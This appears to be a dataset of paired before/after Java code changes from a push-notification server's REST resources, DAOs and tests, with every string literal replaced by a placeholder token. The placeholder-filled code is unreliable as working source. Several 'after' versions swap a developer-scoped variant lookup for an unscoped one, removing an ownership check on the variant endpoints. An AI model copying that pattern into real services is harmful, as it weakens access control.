 * API for uploading JSON file to allow massive device registration (aka import). The Endpoint is protected using <code>HTTP Basic</code> (credentials <code>VariantID:secret</code>). <pre> curl -u ""variantID:secret"" -v -H ""Accept: application/json"" -H ""Content-type: multipart/form-data"" -F ""file=@/path/to/my-devices-for-import.json"" -X POST https://SERVER:PORT/context/rest/registry/device/importer </pre> The format of the JSON file is an array, containing several objects that follow the same syntax used on the <code>/rest/registry/device</code> endpoint. <p> Here is an example: <pre> [ { ""deviceToken"" : ""someTokenString"", ""deviceType"" : ""iPad"", ""operatingSystem"" : ""iOS"", ""osVersion"" : ""6.1.2"", ""alias"" : ""someUsername or email adress..."", ""categories"" : [""football"", ""sport""] }, { ""deviceToken"" : ""someOtherTokenString"", ... }, ... ] </pre>
 * @param form  JSON file to import
 * @return      empty JSON body
 * @responseheader WWW-Authenticate Basic realm=""AeroGear UnifiedPush Server"" (only for 401 response)
 * @statuscode 200 Successful submission of import job
 * @statuscode 400 The format of the client request was incorrect
 * @statuscode 401 The request requires authentication
 */
@POST @Path(""String_Node_Str"") @Consumes(MediaType.MULTIPART_FORM_DATA) @Produces(MediaType.APPLICATION_JSON) @BodyType(""String_Node_Str"") @ReturnType(""String_Node_Str"") public Response importDevice(@MultipartForm ImporterForm form,@Context HttpServletRequest request){
  final Variant variant=loadVariantWhenAuthorized(request);
  if (variant == null) {
    return create401Response(request);
  }
  List<Installation> devices;
  try {
    devices=mapper.readValue(form.getJsonFile(),new TypeReference<List<Installation>>(){
    }
);
  }
 catch (  IOException e) {
    logger.severe(""String_Node_Str"",e);
    return Response.status(Status.BAD_REQUEST).build();
  }
  logger.info(""String_Node_Str"" + devices.size());
  clientInstallationService.addInstallations(variant,devices);
  return Response.ok(EmptyJSON.STRING).build();
}"
91231,"/** 
 * RESTful API for sending Push Notifications. The Endpoint is protected using <code>HTTP Basic</code> (credentials <code>PushApplicationID:masterSecret</code>). <p/><p/> Messages are submitted as flexible JSON maps. Below is a simple example: <pre> curl -u ""PushApplicationID:MasterSecret"" -v -H ""Accept: application/json"" -H ""Content-type: application/json"" -X POST -d '{ ""message"": { ""alert"": ""HELLO!"", ""sound"": ""default"", ""user-data"": { ""key"": ""value"", } }' https://SERVER:PORT/CONTEXT/rest/sender </pre> Details about the Message Format can be found HERE! <p/><p/> <b>Request Header</b>   {@code aerogear-sender} uses to identify the used client. If the header is not present, the standard ""user-agent"" header is used.
 * @param message   message to send
 * @return          empty JSON body
 * @responseheader WWW-Authenticate Basic realm=""AeroGear UnifiedPush Server"" (only for 401 response)
 * @statuscode 202 Indicates the Job has been accepted and is being process by the AeroGear UnifiedPush Server
 * @statuscode 401 The request requires authentication
 */
@POST @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) @BodyType(""String_Node_Str"") @ReturnType(""String_Node_Str"") public Response send(final InternalUnifiedPushMessage message,@Context HttpServletRequest request){
  final PushApplication pushApplication=loadPushApplicationWhenAuthorized(request);
  if (pushApplication == null) {
    return Response.status(Status.UNAUTHORIZED).header(""String_Node_Str"",""String_Node_Str"").entity(""String_Node_Str"").build();
  }
  message.setIpAddress(HttpRequestUtil.extractIPAddress(request));
  message.setClientIdentifier(HttpRequestUtil.extractAeroGearSenderInformation(request));
  notificationRouter.submit(pushApplication,message);
  logger.fine(""String_Node_Str"" + message.getClientIdentifier() + ""String_Node_Str"");
  logger.info(""String_Node_Str"");
  return Response.status(Status.ACCEPTED).entity(EmptyJSON.STRING).build();
}","/** 
 * RESTful API for sending Push Notifications. The Endpoint is protected using <code>HTTP Basic</code> (credentials <code>PushApplicationID:masterSecret</code>). <p> Messages are submitted as flexible JSON maps. Below is a simple example: <pre> curl -u ""PushApplicationID:MasterSecret"" -v -H ""Accept: application/json"" -H ""Content-type: application/json"" -X POST -d '{ ""message"": { ""alert"": ""HELLO!"", ""sound"": ""default"", ""user-data"": { ""key"": ""value"", } }' https://SERVER:PORT/CONTEXT/rest/sender </pre> Details about the Message Format can be found HERE! <p> <b>Request Header</b>   {@code aerogear-sender} uses to identify the used client. If the header is not present, the standard ""user-agent"" header is used.
 * @param message   message to send
 * @return          empty JSON body
 * @responseheader WWW-Authenticate Basic realm=""AeroGear UnifiedPush Server"" (only for 401 response)
 * @statuscode 202 Indicates the Job has been accepted and is being process by the AeroGear UnifiedPush Server
 * @statuscode 401 The request requires authentication
 */
@POST @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) @BodyType(""String_Node_Str"") @ReturnType(""String_Node_Str"") public Response send(final InternalUnifiedPushMessage message,@Context HttpServletRequest request){
  final PushApplication pushApplication=loadPushApplicationWhenAuthorized(request);
  if (pushApplication == null) {
    return Response.status(Status.UNAUTHORIZED).header(""String_Node_Str"",""String_Node_Str"").entity(""String_Node_Str"").build();
  }
  message.setIpAddress(HttpRequestUtil.extractIPAddress(request));
  message.setClientIdentifier(HttpRequestUtil.extractAeroGearSenderInformation(request));
  notificationRouter.submit(pushApplication,message);
  logger.fine(""String_Node_Str"" + message.getClientIdentifier() + ""String_Node_Str"");
  logger.info(""String_Node_Str"");
  return Response.status(Status.ACCEPTED).entity(EmptyJSON.STRING).build();
}"
91232,"@Override public void delete(PushApplication pushApplication){
  PushApplication entity=entityManager.find(PushApplication.class,pushApplication.getId());
  final List<Variant> variants=entity.getVariants();
  if (!variants.isEmpty()) {
    createQuery(""String_Node_Str"").setParameter(""String_Node_Str"",variants).executeUpdate();
  }
  super.delete(entity);
}","@Override public void delete(PushApplication pushApplication){
  PushApplication entity=entityManager.find(PushApplication.class,pushApplication.getId());
  final List<Variant> variants=entity.getVariants();
  if (!variants.isEmpty()) {
    entityManager.createQuery(""String_Node_Str"").setParameter(""String_Node_Str"",variants).executeUpdate();
  }
  super.delete(entity);
}"
91233,"@Override public void deletePushInformationOlderThan(Date oldest){
  createQuery(""String_Node_Str"").setParameter(""String_Node_Str"",oldest).executeUpdate();
  int affectedRows=createQuery(""String_Node_Str"").setParameter(""String_Node_Str"",oldest).executeUpdate();
  logger.info(""String_Node_Str"" + affectedRows + ""String_Node_Str"");
}","@Override public void deletePushInformationOlderThan(Date oldest){
  entityManager.createQuery(""String_Node_Str"").setParameter(""String_Node_Str"",oldest).executeUpdate();
  int affectedRows=entityManager.createQuery(""String_Node_Str"").setParameter(""String_Node_Str"",oldest).executeUpdate();
  logger.info(""String_Node_Str"" + affectedRows + ""String_Node_Str"");
}"
91234,"@DELETE @Path(""String_Node_Str"") public Response deleteVariant(@PathParam(""String_Node_Str"") String variantId){
  Variant variant=searchManager.getSearchService().findByVariantIDForDeveloper(variantId);
  if (variant != null) {
    logger.log(Level.FINEST,""String_Node_Str"" + variant.getClass().getSimpleName());
    variantService.removeVariant(variant);
    return Response.noContent().build();
  }
  return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@DELETE @Path(""String_Node_Str"") public Response deleteVariant(@PathParam(""String_Node_Str"") String variantId){
  Variant variant=variantService.findByVariantID(variantId);
  if (variant != null) {
    logger.log(Level.FINEST,""String_Node_Str"" + variant.getClass().getSimpleName());
    variantService.removeVariant(variant);
    return Response.noContent().build();
  }
  return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91235,"@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) public javax.ws.rs.core.Response resetSecret(@PathParam(""String_Node_Str"") String variantId){
  Variant variant=searchManager.getSearchService().findByVariantIDForDeveloper(variantId);
  if (variant != null) {
    logger.log(Level.FINEST,""String_Node_Str"" + variant.getClass().getSimpleName());
    String newSecret=UUID.randomUUID().toString();
    variant.setSecret(newSecret);
    variantService.updateVariant(variant);
    return Response.ok(variant).build();
  }
  return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) public javax.ws.rs.core.Response resetSecret(@PathParam(""String_Node_Str"") String variantId){
  Variant variant=variantService.findByVariantID(variantId);
  if (variant != null) {
    logger.log(Level.FINEST,""String_Node_Str"" + variant.getClass().getSimpleName());
    String newSecret=UUID.randomUUID().toString();
    variant.setSecret(newSecret);
    variantService.updateVariant(variant);
    return Response.ok(variant).build();
  }
  return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91236,"@GET @Path(""String_Node_Str"") @Produces(MediaType.APPLICATION_JSON) public Response findVariantById(@PathParam(""String_Node_Str"") String variantId){
  Variant variant=searchManager.getSearchService().findByVariantIDForDeveloper(variantId);
  if (variant != null) {
    return Response.ok(variant).build();
  }
  return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@GET @Path(""String_Node_Str"") @Produces(MediaType.APPLICATION_JSON) public Response findVariantById(@PathParam(""String_Node_Str"") String variantId){
  Variant variant=variantService.findByVariantID(variantId);
  if (variant != null) {
    return Response.ok(variant).build();
  }
  return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91237,"protected PushSearchService getSearch(){
  LOGGER.info(""String_Node_Str"");
  LOGGER.info(""String_Node_Str"" + httpServletRequest.isUserInRole(""String_Node_Str""));
  LOGGER.info(""String_Node_Str"");
  return searchManager.getSearchService();
}","protected PushSearchService getSearch(){
  return searchManager.getSearchService();
}"
91238,"@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response updateAndroidVariation(@PathParam(""String_Node_Str"") String id,@PathParam(""String_Node_Str"") String androidID,AndroidVariant updatedAndroidApplication){
  AndroidVariant androidVariant=(AndroidVariant)getSearch().findByVariantIDForDeveloper(androidID);
  if (androidVariant != null) {
    try {
      validateModelClass(updatedAndroidApplication);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    androidVariant.setGoogleKey(updatedAndroidApplication.getGoogleKey());
    androidVariant.setProjectNumber(updatedAndroidApplication.getProjectNumber());
    androidVariant.setName(updatedAndroidApplication.getName());
    androidVariant.setDescription(updatedAndroidApplication.getDescription());
    variantService.updateVariant(androidVariant);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response updateAndroidVariation(@PathParam(""String_Node_Str"") String id,@PathParam(""String_Node_Str"") String androidID,AndroidVariant updatedAndroidApplication){
  AndroidVariant androidVariant=(AndroidVariant)variantService.findByVariantID(androidID);
  if (androidVariant != null) {
    try {
      validateModelClass(updatedAndroidApplication);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    androidVariant.setGoogleKey(updatedAndroidApplication.getGoogleKey());
    androidVariant.setProjectNumber(updatedAndroidApplication.getProjectNumber());
    androidVariant.setName(updatedAndroidApplication.getName());
    androidVariant.setDescription(updatedAndroidApplication.getDescription());
    variantService.updateVariant(androidVariant);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91239,"@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) public Response updateChromePackagedAppVariation(@PathParam(""String_Node_Str"") String id,@PathParam(""String_Node_Str"") String chromeAppID,ChromePackagedAppVariant updatedChromePackagedApplication){
  ChromePackagedAppVariant chromePackagedAppVariant=(ChromePackagedAppVariant)getSearch().findByVariantIDForDeveloper(chromeAppID);
  if (chromePackagedAppVariant != null) {
    if (updatedChromePackagedApplication.getClientSecret() == null) {
      return Response.status(Response.Status.BAD_REQUEST).build();
    }
    chromePackagedAppVariant.setClientId(updatedChromePackagedApplication.getClientId());
    chromePackagedAppVariant.setClientSecret(updatedChromePackagedApplication.getClientSecret());
    chromePackagedAppVariant.setRefreshToken(updatedChromePackagedApplication.getRefreshToken());
    chromePackagedAppVariant.setName(updatedChromePackagedApplication.getName());
    chromePackagedAppVariant.setDescription(updatedChromePackagedApplication.getDescription());
    variantService.updateVariant(chromePackagedAppVariant);
    return Response.noContent().build();
  }
  return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) public Response updateChromePackagedAppVariation(@PathParam(""String_Node_Str"") String id,@PathParam(""String_Node_Str"") String chromeAppID,ChromePackagedAppVariant updatedChromePackagedApplication){
  ChromePackagedAppVariant chromePackagedAppVariant=(ChromePackagedAppVariant)variantService.findByVariantID(chromeAppID);
  if (chromePackagedAppVariant != null) {
    if (updatedChromePackagedApplication.getClientSecret() == null) {
      return Response.status(Response.Status.BAD_REQUEST).build();
    }
    chromePackagedAppVariant.setClientId(updatedChromePackagedApplication.getClientId());
    chromePackagedAppVariant.setClientSecret(updatedChromePackagedApplication.getClientSecret());
    chromePackagedAppVariant.setRefreshToken(updatedChromePackagedApplication.getRefreshToken());
    chromePackagedAppVariant.setName(updatedChromePackagedApplication.getName());
    chromePackagedAppVariant.setDescription(updatedChromePackagedApplication.getDescription());
    variantService.updateVariant(chromePackagedAppVariant);
    return Response.noContent().build();
  }
  return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91240,"@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response updateSimplePushVariation(@PathParam(""String_Node_Str"") String id,@PathParam(""String_Node_Str"") String simplePushID,SimplePushVariant updatedSimplePushApplication){
  SimplePushVariant spVariant=(SimplePushVariant)getSearch().findByVariantIDForDeveloper(simplePushID);
  if (spVariant != null) {
    try {
      validateModelClass(updatedSimplePushApplication);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    spVariant.setName(updatedSimplePushApplication.getName());
    spVariant.setDescription(updatedSimplePushApplication.getDescription());
    variantService.updateVariant(spVariant);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response updateSimplePushVariation(@PathParam(""String_Node_Str"") String id,@PathParam(""String_Node_Str"") String simplePushID,SimplePushVariant updatedSimplePushApplication){
  SimplePushVariant spVariant=(SimplePushVariant)variantService.findByVariantID(simplePushID);
  if (spVariant != null) {
    try {
      validateModelClass(updatedSimplePushApplication);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    spVariant.setName(updatedSimplePushApplication.getName());
    spVariant.setDescription(updatedSimplePushApplication.getDescription());
    variantService.updateVariant(spVariant);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91241,"@PUT @Path(""String_Node_Str"") @Consumes(MediaType.MULTIPART_FORM_DATA) @Produces(MediaType.APPLICATION_JSON) public Response updateiOSVariant(@MultipartForm iOSApplicationUploadForm updatedForm,@PathParam(""String_Node_Str"") String pushApplicationId,@PathParam(""String_Node_Str"") String iOSID){
  iOSVariant iOSVariant=(iOSVariant)getSearch().findByVariantIDForDeveloper(iOSID);
  if (iOSVariant != null) {
    if (!validateCertificateAndPassphrase(updatedForm)) {
      return Response.status(Status.BAD_REQUEST).build();
    }
    iOSVariant.setName(updatedForm.getName());
    iOSVariant.setDescription(updatedForm.getDescription());
    iOSVariant.setPassphrase(updatedForm.getPassphrase());
    iOSVariant.setCertificate(updatedForm.getCertificate());
    iOSVariant.setProduction(updatedForm.getProduction());
    try {
      validateModelClass(iOSVariant);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    variantService.updateVariant(iOSVariant);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@PUT @Path(""String_Node_Str"") @Consumes(MediaType.MULTIPART_FORM_DATA) @Produces(MediaType.APPLICATION_JSON) public Response updateiOSVariant(@MultipartForm iOSApplicationUploadForm updatedForm,@PathParam(""String_Node_Str"") String pushApplicationId,@PathParam(""String_Node_Str"") String iOSID){
  iOSVariant iOSVariant=(iOSVariant)variantService.findByVariantID(iOSID);
  if (iOSVariant != null) {
    if (!validateCertificateAndPassphrase(updatedForm)) {
      return Response.status(Status.BAD_REQUEST).build();
    }
    iOSVariant.setName(updatedForm.getName());
    iOSVariant.setDescription(updatedForm.getDescription());
    iOSVariant.setPassphrase(updatedForm.getPassphrase());
    iOSVariant.setCertificate(updatedForm.getCertificate());
    iOSVariant.setProduction(updatedForm.getProduction());
    try {
      validateModelClass(iOSVariant);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    variantService.updateVariant(iOSVariant);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91242,"@Test public void findVariantByIdForDeveloper(){
  final AndroidVariant av=new AndroidVariant();
  av.setGoogleKey(""String_Node_Str"");
  av.setDeveloper(""String_Node_Str"");
  final String uuid=av.getVariantID();
  variantDao.create(av);
  assertThat(variantDao.findByVariantIDForDeveloper(uuid,""String_Node_Str"")).isNotNull();
  assertThat(variantDao.findByVariantIDForDeveloper(null,""String_Node_Str"")).isNull();
  assertThat(variantDao.findByVariantIDForDeveloper(uuid,""String_Node_Str"")).isNull();
}","@Test public void findVariantByIdForDeveloper(){
  final AndroidVariant av=new AndroidVariant();
  av.setGoogleKey(""String_Node_Str"");
  av.setDeveloper(""String_Node_Str"");
  final String uuid=av.getVariantID();
  variantDao.create(av);
  assertThat(variantDao.findByVariantID(uuid)).isNotNull();
  assertThat(variantDao.findByVariantID(null)).isNull();
}"
91243,"@Test public void lookupNonExistingVariant(){
  AndroidVariant variant=(AndroidVariant)variantDao.findByVariantIDForDeveloper(""String_Node_Str"",""String_Node_Str"");
  assertThat(variant).isNull();
}","@Test public void lookupNonExistingVariant(){
  AndroidVariant variant=(AndroidVariant)variantDao.findByVariantID(""String_Node_Str"");
  assertThat(variant).isNull();
}"
91244,"@Module public Beans getBeans(){
  final Beans beans=new Beans();
  beans.addManagedClass(ClientInstallationServiceImpl.class);
  beans.addManagedClass(JPAInstallationDao.class);
  beans.addManagedClass(GenericVariantServiceImpl.class);
  beans.addManagedClass(JPAVariantDao.class);
  beans.addManagedClass(PushSearchByDeveloperServiceImpl.class);
  beans.addManagedClass(PushApplicationServiceImpl.class);
  beans.addManagedClass(JPAPushApplicationDao.class);
  beans.addManagedClass(PushSearchServiceImpl.class);
  beans.addManagedClass(SearchManager.class);
  return beans;
}","@Module public Beans getBeans(){
  final Beans beans=new Beans();
  beans.addManagedClass(ClientInstallationServiceImpl.class);
  beans.addManagedClass(JPAPushMessageInformationDao.class);
  beans.addManagedClass(JPAInstallationDao.class);
  beans.addManagedClass(GenericVariantServiceImpl.class);
  beans.addManagedClass(JPAVariantDao.class);
  beans.addManagedClass(PushSearchByDeveloperServiceImpl.class);
  beans.addManagedClass(PushApplicationServiceImpl.class);
  beans.addManagedClass(JPAPushApplicationDao.class);
  beans.addManagedClass(PushSearchServiceImpl.class);
  beans.addManagedClass(SearchManager.class);
  return beans;
}"
91245,"@Module public Beans getBeans(){
  final Beans beans=new Beans();
  beans.addManagedClass(JPAVariantDao.class);
  beans.addManagedClass(PushApplicationServiceImpl.class);
  beans.addManagedClass(JPAPushApplicationDao.class);
  beans.addManagedClass(PushSearchByDeveloperServiceImpl.class);
  beans.addManagedClass(PushSearchServiceImpl.class);
  beans.addManagedClass(SearchManager.class);
  return beans;
}","@Module public Beans getBeans(){
  final Beans beans=new Beans();
  beans.addManagedClass(JPAVariantDao.class);
  beans.addManagedClass(JPAInstallationDao.class);
  beans.addManagedClass(JPAPushMessageInformationDao.class);
  beans.addManagedClass(PushApplicationServiceImpl.class);
  beans.addManagedClass(JPAPushApplicationDao.class);
  beans.addManagedClass(PushSearchByDeveloperServiceImpl.class);
  beans.addManagedClass(PushSearchServiceImpl.class);
  beans.addManagedClass(SearchManager.class);
  beans.addManagedClass(InstallationDao.class);
  return beans;
}"
91246,"/** 
 * Identifies the device/user-agent within its PushNetwork. <ul> <li> APNs: <code>deviceToken</code> <li> GCM: <code>registrationId</code> <li> SimplePush: <code>pushEndpoint</code> </ul>
 * @param deviceToken unique string to identify an Installation with its PushNetwork
 */
public void setDeviceToken(final String deviceToken){
  this.deviceToken=deviceToken;
}","/** 
 * Identifies the device/user-agent within its PushNetwork. <ul> <li> APNs: <code>deviceToken</code> <li> GCM: <code>registrationId</code> <li> SimplePush: <code>pushEndoint</code> </ul>
 * @param deviceToken unique string to identify an Installation with its PushNetwork
 */
public void setDeviceToken(final String deviceToken){
  this.deviceToken=deviceToken;
}"
91247,"@GET @Produces(MediaType.APPLICATION_JSON) public Response listAlliOSVariantsForPushApp(@Context HttpServletRequest request,@PathParam(""String_Node_Str"") String pushApplicationID){
  Set<iOSVariant> iosVariants=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,request.getUserPrincipal().getName()).getIOSVariants();
  stripPassphraseAndCertificate(iosVariants);
  return Response.ok(iosVariants).build();
}","@GET @Produces(MediaType.APPLICATION_JSON) public Response listAlliOSVariantsForPushApp(@Context HttpServletRequest request,@PathParam(""String_Node_Str"") String pushApplicationID){
  Collection<iOSVariant> iosVariants=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,request.getUserPrincipal().getName()).getIOSVariants();
  stripPassphraseAndCertificate(iosVariants);
  return Response.ok(iosVariants).build();
}"
91248,"@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) public Response updateAndroidVariation(@PathParam(""String_Node_Str"") String id,@PathParam(""String_Node_Str"") String androidID,AndroidVariant updatedAndroidApplication){
  AndroidVariant androidVariant=(AndroidVariant)variantService.findByVariantIDForDeveloper(androidID,loginName.get());
  if (androidVariant != null) {
    try {
      validateModelClass(updatedAndroidApplication);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    androidVariant.setGoogleKey(updatedAndroidApplication.getGoogleKey());
    androidVariant.setProjectNumber(updatedAndroidApplication.getProjectNumber());
    androidVariant.setName(updatedAndroidApplication.getName());
    androidVariant.setDescription(updatedAndroidApplication.getDescription());
    variantService.updateVariant(androidVariant);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}","@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response updateAndroidVariation(@PathParam(""String_Node_Str"") String id,@PathParam(""String_Node_Str"") String androidID,AndroidVariant updatedAndroidApplication){
  AndroidVariant androidVariant=(AndroidVariant)variantService.findByVariantIDForDeveloper(androidID,loginName.get());
  if (androidVariant != null) {
    try {
      validateModelClass(updatedAndroidApplication);
    }
 catch (    ConstraintViolationException cve) {
      ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
      return builder.build();
    }
    androidVariant.setGoogleKey(updatedAndroidApplication.getGoogleKey());
    androidVariant.setProjectNumber(updatedAndroidApplication.getProjectNumber());
    androidVariant.setName(updatedAndroidApplication.getName());
    androidVariant.setDescription(updatedAndroidApplication.getDescription());
    variantService.updateVariant(androidVariant);
    return Response.noContent().build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
}"
91249,"@POST @Consumes(MediaType.APPLICATION_JSON) public Response registerAndroidVariant(AndroidVariant androidVariant,@PathParam(""String_Node_Str"") String pushApplicationID,@Context UriInfo uriInfo){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp == null) {
    return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  try {
    validateModelClass(androidVariant);
  }
 catch (  ConstraintViolationException cve) {
    ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
    return builder.build();
  }
  androidVariant.setDeveloper(loginName.get());
  androidVariant=(AndroidVariant)variantService.addVariant(androidVariant);
  pushAppService.addAndroidVariant(pushApp,androidVariant);
  return Response.created(uriInfo.getAbsolutePathBuilder().path(String.valueOf(androidVariant.getVariantID())).build()).entity(androidVariant).build();
}","@POST @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response registerAndroidVariant(AndroidVariant androidVariant,@PathParam(""String_Node_Str"") String pushApplicationID,@Context UriInfo uriInfo){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp == null) {
    return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  try {
    validateModelClass(androidVariant);
  }
 catch (  ConstraintViolationException cve) {
    ResponseBuilder builder=createBadRequestResponse(cve.getConstraintViolations());
    return builder.build();
  }
  androidVariant.setDeveloper(loginName.get());
  androidVariant=(AndroidVariant)variantService.addVariant(androidVariant);
  pushAppService.addAndroidVariant(pushApp,androidVariant);
  return Response.created(uriInfo.getAbsolutePathBuilder().path(String.valueOf(androidVariant.getVariantID())).build()).entity(androidVariant).build();
}"
91250,"@POST @Consumes(MediaType.APPLICATION_JSON) public Response registerChromePackagedAppVariant(ChromePackagedAppVariant chromePackagedAppVariant,@PathParam(""String_Node_Str"") String pushApplicationID,@Context UriInfo uriInfo){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp == null) {
    return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  if (chromePackagedAppVariant.getClientSecret() == null) {
    return Response.status(Response.Status.BAD_REQUEST).build();
  }
  chromePackagedAppVariant.setVariantID(UUID.randomUUID().toString());
  chromePackagedAppVariant.setDeveloper(loginName.get());
  chromePackagedAppVariant=(ChromePackagedAppVariant)variantService.addVariant(chromePackagedAppVariant);
  pushAppService.addChromePackagedAppVariant(pushApp,chromePackagedAppVariant);
  return Response.created(uriInfo.getAbsolutePathBuilder().path(String.valueOf(chromePackagedAppVariant.getVariantID())).build()).entity(chromePackagedAppVariant).build();
}","@POST @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response registerChromePackagedAppVariant(ChromePackagedAppVariant chromePackagedAppVariant,@PathParam(""String_Node_Str"") String pushApplicationID,@Context UriInfo uriInfo){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp == null) {
    return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  if (chromePackagedAppVariant.getClientSecret() == null) {
    return Response.status(Response.Status.BAD_REQUEST).build();
  }
  chromePackagedAppVariant.setVariantID(UUID.randomUUID().toString());
  chromePackagedAppVariant.setDeveloper(loginName.get());
  chromePackagedAppVariant=(ChromePackagedAppVariant)variantService.addVariant(chromePackagedAppVariant);
  pushAppService.addChromePackagedAppVariant(pushApp,chromePackagedAppVariant);
  return Response.created(uriInfo.getAbsolutePathBuilder().path(String.valueOf(chromePackagedAppVariant.getVariantID())).build()).entity(chromePackagedAppVariant).build();
}"
91251,"@DELETE @Path(""String_Node_Str"") public Response removeInstallation(@PathParam(""String_Node_Str"") String variantId,@PathParam(""String_Node_Str"") String installationId){
  InstallationImpl installation=clientInstallationService.findById(installationId);
  if (installation == null) {
    return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  clientInstallationService.removeInstallation(installation);
  return Response.noContent().build();
}","@DELETE @Path(""String_Node_Str"") @Produces(MediaType.APPLICATION_JSON) public Response removeInstallation(@PathParam(""String_Node_Str"") String variantId,@PathParam(""String_Node_Str"") String installationId){
  InstallationImpl installation=clientInstallationService.findById(installationId);
  if (installation == null) {
    return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  clientInstallationService.removeInstallation(installation);
  return Response.noContent().build();
}"
91252,"@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) public Response updateInstallation(InstallationImpl entity,@PathParam(""String_Node_Str"") String variantId,@PathParam(""String_Node_Str"") String installationId){
  InstallationImpl installation=clientInstallationService.findById(installationId);
  if (installation == null) {
    return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  clientInstallationService.updateInstallation(installation,entity);
  return Response.noContent().build();
}","@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) @Produces(MediaType.APPLICATION_JSON) public Response updateInstallation(InstallationImpl entity,@PathParam(""String_Node_Str"") String variantId,@PathParam(""String_Node_Str"") String installationId){
  InstallationImpl installation=clientInstallationService.findById(installationId);
  if (installation == null) {
    return Response.status(Response.Status.NOT_FOUND).entity(""String_Node_Str"").build();
  }
  clientInstallationService.updateInstallation(installation,entity);
  return Response.noContent().build();
}"
91253,"@PUT @Path(""String_Node_Str"") @Consumes(MediaType.APPLICATION_JSON) public Response resetMasterSecret(@PathParam(""String_Node_Str"") String pushApplicationID){
  PushApplication pushApp=pushAppService.findByPushApplicationIDForDeveloper(pushApplicationID,loginName.get());
  if (pushApp != null) {
    String newMasterSecret=UUID.randomUUID().toString();
    pushApp.setMasterSecret(newMasterSecret);
    pushAppService.updatePushApplication(pushApp);
    return Response.ok(pushApp).build();
  }
  return Response.status(Status.NOT_FOUND).entity(""String_Node_Str"").build();
